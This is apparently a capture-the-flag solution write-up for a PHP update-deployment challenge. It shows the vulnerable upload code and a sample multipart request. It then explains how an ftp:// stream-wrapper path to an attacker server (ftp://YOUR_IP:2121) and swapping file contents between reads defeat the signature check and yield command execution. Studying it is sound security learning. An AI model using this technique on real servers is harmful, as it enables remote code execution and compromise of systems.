# Solution

The site provides a small interface to deploy updates. At the top, a button saying 'Source code' can be found.

When looking at the source code, we can see 4 main features:
- Upload an update configuration
- Download the current configuration
- Reset the update configuration
- Deploy the update configuration

Looking into the code for each, and also by downloading the current config, we notice that the format looks something like this:

```xml
<?xml version="1.0"?>
<root>
  <data>sh update.sh</data>
  <signature>df12f376d40cd908c4df24e3051f932589d958a3</signature>
</root>
```

Where the `signature` field is an HMAC with SHA1 of the `data` field.

Unfortunately, this means we can't simply modify the `data` field and upload a new version with arbitrary code.

However, we can see that the upload logic looks a little suspicious, as it is using the full path from the multipart form data.

When you upload a file over HTTP with multipart form data, a request may look something like this:

```http
POST /?upload HTTP/1.1
Host: 127.0.0.1
Content-Length: 322
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBJiJwAbjgtC32bSh

------WebKitFormBoundaryBJiJwAbjgtC32bSh
Content-Disposition: form-data; name="update-config"; filename="foo"
Content-Type: text/xml

<?xml version="1.0"?>
<root><data>cat</data><signature>71b031d6893f47159ed64e9b5d5dbf341dc82e92</signature></root>

------WebKitFormBoundaryBJiJwAbjgtC32bSh--
```

The specific interesting part is the filename.

If we look at the validation code:

```php
<?php

// ...

function is_filename_valid($filename)
{
    return preg_match('/^[^\/.g-j][^.g-j]*$/i', $filename);
}

function handle_submission()
{
    global $message, $algorithm, $config_file, $is_error;

    $is_error = true;

    if (!isset($_FILES["update-config"])) {
        return;
    }

    $filename = $_FILES["update-config"]["full_path"];
    if (!is_filename_valid($filename)) {
        $message = "The filename $filename is not valid";
        return;
    }

    move_uploaded_file($_FILES["update-config"]["tmp_name"], $filename);

    if (!is_signature_valid($filename)) {
        unlink($filename);
        $message = "The file does not have a valid signature.";
        return;
    }

    copy($filename, $config_file);
    unlink($filename);

    $is_error = false;
    $message = "File was uploaded successfully!";
}
```

We can see that the filename is used as we want to copy the generated uploaded file to the location specified by the request. However, a regex is used to validate the filename.

The regex will validate that the string contains no characters between `g` and `j` (`g`, `h`, `i`, `j`) and contains no dot character. Furthermore, it prevents the path from starting with a slash. This effectively makes it impossible to do some kind of path traversal outside of the working directory or a child directory, as we can't specify an absolute path or a relative path.

However, we need to keep in mind that PHP supports stream wrappers. This effectively means we can specify schemes in calls to various I/O related functions where the filename should be. The full list of schemes can be found here: https://www.php.net/manual/en/wrappers.php

If we match which wrappers work with the regex the backend validates, we can find that these ones are valid:
- `ftp`: Enabled by default. Allows opening file from another server.
- `data`: Data URIs. Not necessarily useful since they will just read the data we encode, which is effectively the same thing as using the uploaded file
- `rar`: Needs RAR extension
- `expect`: Needs expect extension

From this list, the `ftp` is most interesting, as the file is opened and read multiple times. The general steps used are as follows:
1. Compute the MD5
2. Copy the uploaded file to the filename
3. Verify the signature
4. Verify the MD5 still matches
5. Copy the file back to the current config file

This means we could send a malicious config file with the path being our FTP server, and when it tries to compute the signature, we make the PHP server download a valid config file for the verification to pass. However, after that we need to change it back to the payload to make sure the MD5 check passes.

Note: Another small limitation is the fact we cannot use dots as part of the filename. We can simply encode our IP as decimal for this to be bypassed.

So the exploit would look something like this:

1. Upload `evil.xml` with the filename being `ftp://YOUR_IP:2121/whatever`
2. On your FTP server, return the original `config.xml` 2 times (one for `move_uploaded_file` and the other for `is_signature_valid`)
3. Now return `evil.xml`, the MD5 will check whether our request's body matches with that sent file
4. We can now run any command :)

An example shell program is implemented in `exploit.py`.
